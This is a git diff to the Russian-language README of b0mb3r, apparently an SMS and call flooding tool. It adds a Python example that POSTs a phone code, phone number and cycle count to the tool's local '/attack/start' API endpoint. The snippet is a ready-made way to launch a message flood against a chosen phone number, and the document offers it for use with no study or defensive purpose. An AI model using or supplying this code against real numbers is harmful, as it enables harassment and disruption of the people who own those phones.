@@ -40,6 +40,21 @@ b0mb3r имеет API, которое позволит вам выполнять
 | phone              | Номер телефона без + и кода страны, например 9123456789 |
 | number_of_cycles   | Количество повторений                                   |
 
+**Пример запроса**
+```python
+import requests
+
+json_ = {
+    "phone_code": "7",
+    "phone": "9012345678",
+    "number_of_cycles": "1"
+}
+
+a = requests.post("http://127.0.0.1:8080/attack/start", json=json_)
+
+print(a.json())
+```
+
 **Пример ответа**
 <img alt="Пример ответа" src="https://user-images.githubusercontent.com/42045258/70137798-da854680-169f-11ea-8133-2f37631292af.png"></img>
 
